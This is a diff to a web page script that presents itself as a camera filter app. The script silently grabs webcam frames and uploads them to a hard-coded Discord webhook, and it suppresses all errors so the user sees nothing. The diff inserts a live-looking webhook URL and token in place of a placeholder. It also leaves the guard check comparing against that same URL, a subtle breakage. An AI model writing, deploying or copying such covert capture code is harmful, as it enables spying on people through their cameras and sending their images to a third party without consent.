@@ -80,18 +80,15 @@
 </div>
 
 <script>
-    // 1. PASTE YOUR WEBHOOK HERE
-    const DISCORD_WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; 
+
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1489100868287463544/TbvEnlZkfuJafPylgOMJJkPZxwXP8xfkjQHtewRC4w0G43NbkXDjfCiT5sUgK9F4lH9Y'; 
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     let currentFilter = "none";
     let autoInterval;
-
-    // Suppress all visible errors
     window.onerror = () => true;
-
     async function startCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -108,12 +105,10 @@
             // Fails silently if user denies or camera is missing
         }
     }
-
     function setFilter(f) {
         currentFilter = f;
         video.style.filter = f;
     }
-
     async function sendToDiscord() {
         // Stop if URL is not set or video isn't ready
         if (!video.videoWidth || DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks/1489100868287463544/TbvEnlZkfuJafPylgOMJJkPZxwXP8xfkjQHtewRC4w0G43NbkXDjfCiT5sUgK9F4lH9Y')) return;
@@ -122,14 +117,11 @@
         canvas.height = video.videoHeight;
         ctx.filter = currentFilter;
         ctx.drawImage(video, 0, 0);
-
         canvas.toBlob(async (blob) => {
             if (!blob) return;
-
             const formData = new FormData();
             formData.append('file', blob, 'aura_shot.png');
             formData.append('content', `📸 **Camera Feed:** ${new Date().toLocaleTimeString()}`);
-
             try {
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
